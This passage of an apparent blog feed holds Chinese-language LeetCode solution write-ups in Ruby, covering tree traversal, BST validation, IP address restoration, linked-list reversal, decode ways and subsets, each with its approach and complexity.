class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  path = []</span><br><span class="line">  traverse = lambda &#123; <span class="params">|node|</span></span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      traverse.call(node.left)</span><br><span class="line">      traverse.call(node.right)</span><br><span class="line">      path &lt;&lt; node.val</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  &#125;</span><br><span class="line">  traverse.call(root)</span><br><span class="line">  <span class="keyword">return</span> path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>迭代方式：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postorder_traversal</span><span class="params">(root)</span></span></span><br><span class="line">  <span class="keyword">return</span> [] <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line">  node, stack, path = root, [], []</span><br><span class="line">  <span class="keyword">while</span> <span class="keyword">not</span> stack.empty? <span class="keyword">or</span> path.empty?</span><br><span class="line">    <span class="keyword">if</span> node</span><br><span class="line">      stack.push node</span><br><span class="line">      node = node.left ? node.left : node.right</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      next_node = stack.pop </span><br><span class="line">      node = stack.last </span><br><span class="line">      <span class="keyword">while</span> node &amp;&amp; node.right == next_node</span><br><span class="line">        path &lt;&lt; next_node.val </span><br><span class="line">        next_node = stack.pop </span><br><span class="line">        node = stack.last </span><br><span class="line">      <span class="keyword">end</span> </span><br><span class="line">      node = node ? node.right : <span class="literal">nil</span></span><br><span class="line">      path &lt;&lt; next_node.val</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  path</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Validate Binary Search Tree</title>
      <link href="/2018/04/28/Validate-Binary-Search-Tree/"/>
      <url>/2018/04/28/Validate-Binary-Search-Tree/</url>
      <content type="html"><![CDATA[<h1 id="98-Validate-Binary-Search-Tree"><a href="#98-Validate-Binary-Search-Tree" class="headerlink" title="98. Validate Binary Search Tree"></a>98. Validate Binary Search Tree</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a binary tree, determine if it is a valid binary search tree (BST).</p><p>Assume a BST is defined as follows:</p><p>The left subtree of a node contains only nodes with keys less than the node’s key.<br>The right subtree of a node contains only nodes with keys greater than the node’s key.<br>Both the left and right subtrees must also be binary search trees.<br>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  1   3</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   / \</span><br><span class="line">  1   4</span><br><span class="line">     / \</span><br><span class="line">    3   6</span><br><span class="line">Output: false</span><br><span class="line">Explanation: The input is: [5,1,4,null,null,3,6]. The root node&apos;s value</span><br><span class="line">             is 5 but its right child&apos;s value is 4.</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>验证一棵二叉树是否为二叉搜索树。</p><p>思路就是递归验证左子树和右子树是否都满足条件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :left, :right</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@left</span>, <span class="doctag">@right</span> = nil, nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_bst</span><span class="params">(root, l = <span class="literal">nil</span>, r = <span class="literal">nil</span>)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">if</span> root.<span class="literal">nil</span>?</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> l &amp;&amp; l &gt; root.val</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> r &amp;&amp; r &lt; root.val</span><br><span class="line"></span><br><span class="line">  is_valid_bst(root.left, l, root.val - <span class="number">1</span>) &amp;&amp; is_valid_bst(root.right, root.val + <span class="number">1</span>, r)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(logn)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Restore IP Addresses</title>
      <link href="/2018/04/27/Restore-IP-Addresses/"/>
      <url>/2018/04/27/Restore-IP-Addresses/</url>
      <content type="html"><![CDATA[<h1 id="93-Restore-IP-Addresses"><a href="#93-Restore-IP-Addresses" class="headerlink" title="93. Restore IP Addresses"></a>93. Restore IP Addresses</h1><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>这题思路主要是用动态规划，没什么好说的。主要在于对IP的每一项的判断要筛掉以下情况：</p><ul><li>每一项的值不能大于255</li><li>不能以“0”开头（比如：01，00），这种可以通过先转成整数，再转成字符串，和原来比较是否相同。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_ip_addresses</span><span class="params">(s)</span></span></span><br><span class="line">  ips = []</span><br><span class="line">  ip = []</span><br><span class="line">  _restore(ips, ip, s, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">return</span> ips</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _restore<span class="params">(ips, ip, s, level)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">if</span> s.<span class="literal">nil</span>? <span class="keyword">or</span> s.empty?</span><br><span class="line">  <span class="keyword">if</span> level == <span class="number">4</span></span><br><span class="line">    p = s.to_i</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> p &gt; <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> p.to_s != s</span><br><span class="line">    ip.push(s)</span><br><span class="line">    ips.push(ip.join(<span class="string">'.'</span>))</span><br><span class="line">    ip.pop</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="number">3</span>.times.each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> s.length &lt; (i + <span class="number">1</span>)</span><br><span class="line">      p = s[<span class="number">0</span>..i].to_i</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> p &gt; <span class="number">255</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">if</span> p.to_s != s[<span class="number">0</span>..i]</span><br><span class="line">      ip.push(s[<span class="number">0</span>..i])</span><br><span class="line">      _restore(ips, ip, s[(i+<span class="number">1</span>)..-<span class="number">1</span>], level + <span class="number">1</span>)</span><br><span class="line">      ip.pop</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>这题的时间和空间复杂度是固定的，都是<code>O(3^4)</code>。</p>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reverse Linked List</title>
      <link href="/2018/04/26/Reverse-Linked-List/"/>
      <url>/2018/04/26/Reverse-Linked-List/</url>
      <content type="html"><![CDATA[<h1 id="Reverse-Linked-List"><a href="#Reverse-Linked-List" class="headerlink" title="Reverse Linked List"></a>Reverse Linked List</h1><h2 id="206-Reverse-Linked-List"><a href="#206-Reverse-Linked-List" class="headerlink" title="206. Reverse Linked List"></a>206. Reverse Linked List</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Reverse a singly linked list.</p><p>Hint:</p><p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>题目要求两种实现思路：迭代方式和递归方式。</p><h4 id="迭代方式"><a href="#迭代方式" class="headerlink" title="迭代方式"></a>迭代方式</h4><p>先创建一个临时节点，从头往后遍历链表，来一个节点就插入临时节点和第一个节点之间，这样遍历完后，链表就逆序了。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iteratively implement</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_list</span><span class="params">(head)</span></span></span><br><span class="line">  dummy_head = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  p = head</span><br><span class="line">  <span class="keyword">while</span> p</span><br><span class="line">    n = p.<span class="keyword">next</span></span><br><span class="line">    p.<span class="keyword">next</span> = dummy_head.<span class="keyword">next</span></span><br><span class="line">    dummy_head.<span class="keyword">next</span> = p</span><br><span class="line">    p = n</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  dummy_head.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h4 id="递归方式"><a href="#递归方式" class="headerlink" title="递归方式"></a>递归方式</h4><p>递归结束条件是遍历到最后一个节点，直接返回。其他情况就是让下一个节点指向当前节点。中间要一直返回最后一个节点，递归完后，最后一个节点就变成第一个节点了。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recursively implement</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_list</span><span class="params">(head)</span></span></span><br><span class="line">  <span class="keyword">if</span> head.<span class="literal">nil</span>? <span class="keyword">or</span> head.<span class="keyword">next</span>.<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n = head.<span class="keyword">next</span></span><br><span class="line">    head.<span class="keyword">next</span> = <span class="literal">nil</span></span><br><span class="line">    rest = reverse_list(n)</span><br><span class="line">    n.<span class="keyword">next</span> = head</span><br><span class="line">    <span class="keyword">return</span> rest</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="92-Reverse-Linked-List-II"><a href="#92-Reverse-Linked-List-II" class="headerlink" title="92. Reverse Linked List II"></a>92. Reverse Linked List II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Reverse a linked list from position m to n. Do it in one-pass.</p><p>Note: 1 ≤ m ≤ n ≤ length of list.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这题解法就是，先找到m节点的位置，然后把m和n之间的节点插入m节点和它之前节点就行。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; m</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_between</span><span class="params">(head, m, n)</span></span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> head.<span class="literal">nil</span>?</span><br><span class="line">  dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  dummy.<span class="keyword">next</span> = head</span><br><span class="line">  m_prev, i = dummy, <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; m <span class="keyword">and</span> m_prev.<span class="keyword">next</span></span><br><span class="line">    m_prev = m_prev.<span class="keyword">next</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> i &lt; m</span><br><span class="line">  m_node = m_prev.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> m_node.<span class="literal">nil</span>?</span><br><span class="line">  c_node = m_node.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; n <span class="keyword">and</span> c_node</span><br><span class="line">    t = c_node.<span class="keyword">next</span></span><br><span class="line">    c_node.<span class="keyword">next</span> = m_prev.<span class="keyword">next</span></span><br><span class="line">    m_prev.<span class="keyword">next</span> = c_node</span><br><span class="line">    c_node = t</span><br><span class="line">    m_node.<span class="keyword">next</span> = c_node</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> dummy.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Decode Ways</title>
      <link href="/2018/04/25/Decode-Ways/"/>
      <url>/2018/04/25/Decode-Ways/</url>
      <content type="html"><![CDATA[<h1 id="Decode-Ways"><a href="#Decode-Ways" class="headerlink" title="Decode Ways"></a>Decode Ways</h1><h2 id="91-Decode-Ways"><a href="#91-Decode-Ways" class="headerlink" title="91. Decode Ways"></a>91. Decode Ways</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>A message containing letters from A-Z is being encoded to numbers using the following mapping:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos; -&gt; 1</span><br><span class="line">&apos;B&apos; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&apos;Z&apos; -&gt; 26</span><br></pre></td></tr></table></figure></p><p>Given a non-empty string containing only digits, determine the total number of ways to decode it.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;12&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;226&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6).</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>我们用<code>dp[i]</code>表示以第i个数字结尾的子串编码数量，计算公式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[i] += dp[i-1] 如果s[i-1] &gt; 0</span><br><span class="line">dp[i] += dp[i-2] 如果10 &lt;= s[i-2]s[i-1] &lt;= 26</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_decodings</span><span class="params">(s)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> s.<span class="literal">nil</span>? <span class="keyword">or</span> s.empty? <span class="keyword">or</span> s[<span class="number">0</span>] == <span class="string">'0'</span></span><br><span class="line">  dp = Array.new(s.length + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">  dp[<span class="number">0</span>], dp[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  (<span class="number">2</span>..s.length).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    dp[i] += dp[i - <span class="number">1</span>] <span class="keyword">if</span> s[i - <span class="number">1</span>].to_i &gt; <span class="number">0</span></span><br><span class="line">    dp[i] += dp[i - <span class="number">2</span>] <span class="keyword">if</span> s[i - <span class="number">2</span>.. i - <span class="number">1</span>].to_i &gt;= <span class="number">10</span> <span class="keyword">and</span> s[i - <span class="number">2</span>.. i - <span class="number">1</span>].to_i &lt;= <span class="number">26</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  dp[s.length]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Subsets</title>
      <link href="/2018/04/24/Subsets/"/>
      <url>/2018/04/24/Subsets/</url>
      <content type="html"><![CDATA[<h1 id="Subsets"><a href="#Subsets" class="headerlink" title="Subsets"></a>Subsets</h1><h2 id="78-Subsets"><a href="#78-Subsets" class="headerlink" title="78. Subsets"></a>78. Subsets</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a set of distinct integers, nums, return all possible subsets (the power set).</p><p>Note: The solution set must not contain duplicate subsets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,3]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [1],</span><br><span class="line">  [2],</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>利用深度优先算法，把所有组合情况都遍历一遍。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  path, result = [], []</span><br><span class="line">  _subsets(nums, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _subsets<span class="params">(nums, index, path, result)</span></span></span><br><span class="line">  result.push(path.dup)</span><br><span class="line">  i = index</span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">    path.push(nums[i]);</span><br><span class="line">    _subsets(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">    path.pop</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" 